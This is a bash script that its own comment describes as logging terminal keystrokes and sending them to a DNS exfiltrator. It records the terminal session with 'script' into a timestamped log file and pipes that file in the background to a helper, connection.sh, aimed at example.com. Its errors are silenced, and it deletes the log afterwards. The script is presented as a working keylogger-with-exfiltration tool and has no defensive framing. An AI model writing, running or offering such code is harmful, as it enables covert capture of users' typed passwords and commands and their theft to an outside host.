#!/bin/bash
# Log terminal keystrokes and send to dns exfiltrator
# Usage: command [-options]
# Options:
#   -p path: give path to log file to listen to

# check if already running
if pidof -x "abc.sh" >/dev/null; then
  echo "Already running"
  exit 1;
fi

# globals/constants
log_file_path="/tmp/file-$(date +%s).log"

# check command line options
while [ $# -gt 0 ]; do
  # check if server is on localhost
  if [ $1 = "-p" ]; then
    if ! [ -n "$2" ]; then
      echo "You must specify a directory when using the -p option"
      exit 1
    fi
    if ! [ -d "$2" ]; then
      echo "Directory does not exist"
      exit 1
    fi
    log_file_path="$2/file-$(date +%s).log"
  else
    # if it isn't an option, break out of the loop
    break
  fi
  shift
done

# start background script to check for changes in log file
(tail -F "$log_file_path" | ./connection.sh -l "example.com") &> /dev/null &
bg_pid=$!

# start logger
script -f -q -I "$log_file_path" 2> /dev/null

# stop background script and delete log file
kill -9 "$bg_pid"
wait "$bg_pid" &> /dev/null
rm "$log_file_path"
exit 0